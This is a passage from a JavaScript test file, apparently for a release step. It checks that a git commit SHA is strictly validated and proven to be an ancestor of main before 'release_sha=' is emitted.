  for (const sha of ['a'.repeat(39), 'a'.repeat(41), 'main', `refs/heads/${'a'.repeat(29)}`, OID.toUpperCase(), '']) {
    const r = runIdentity({ sha });
    assert.notEqual(r.status, 0, JSON.stringify(sha));
    assert.equal(r.calls, '', `${JSON.stringify(sha)} must be refused before git`);
  }
});

test('EXECUTED: a 40-hex OID that is not a commit is refused', () => {
  for (const type of ['tag', 'blob', 'tree', 'missing']) {
    const r = runIdentity({ sha: OID, type });
    assert.notEqual(r.status, 0, type);
    assert.match(r.calls, /cat-file -t/, type);
  }
});

test('EXECUTED: a resolution that differs from the input is refused — nothing mutable is emitted', () => {
  const r = runIdentity({ sha: OID, resolved: 'b'.repeat(40) });
  assert.notEqual(r.status, 0);
  assert.equal(r.out.includes('release_sha='), false, 'no output may be emitted on refusal');
});

test('EXECUTED: a non-ancestor of main is refused', () => {
  const r = runIdentity({ sha: OID, ancestorExit: 1 });
  assert.notEqual(r.status, 0);
  assert.match(r.calls, /merge-base --is-ancestor/);
});

test('EXECUTED: the happy path emits the resolved OID, in order, after every proof', () => {
  const r = runIdentity({ sha: OID });
  assert.equal(r.status, 0, r.calls);
  assert.equal(r.out.trim(), `release_sha=${OID}`);
  const order = ['fetch', 'cat-file', 'rev-parse', 'merge-base'];
  let last = -1;
  for (const step of order) {
    const idx = r.calls.indexOf(step);
    assert.ok(idx > last, `${step} runs, and after the previous proof`);
    last = idx;
  }
});
